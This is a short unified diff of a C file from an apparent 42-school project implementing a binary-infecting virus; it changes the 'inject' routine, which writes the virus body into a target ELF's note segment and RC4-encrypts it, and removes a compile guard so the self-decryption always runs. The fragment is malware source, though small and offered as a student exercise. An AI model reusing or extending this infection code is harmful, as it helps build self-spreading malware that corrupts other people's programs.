@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/31 19:51:10 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/31 20:57:04 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,10 +14,8 @@
 
 void		inject(t_data *data)
 {
-#ifdef ENCRYPT
 //	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
 	update_two(&data->key, (char*)inject, (size_t)release - (size_t)inject);
-#endif
 
 # ifdef DEBUG
 	char de[] = "inject\t \n";
@@ -81,7 +79,7 @@ void		inject(t_data *data)
 	// step 6 : Encrypt data
    	dst = map + (data->virus.note->p_offset + ((size_t)opening - (size_t)start));
 	_memcpy(data->cpr_key, (uint8_t*)start, KEY_SIZE);
-	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)end - (size_t)opening);
+	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)opening);
 
 	// final : write
 	_write(data->bin.fd, map, size);
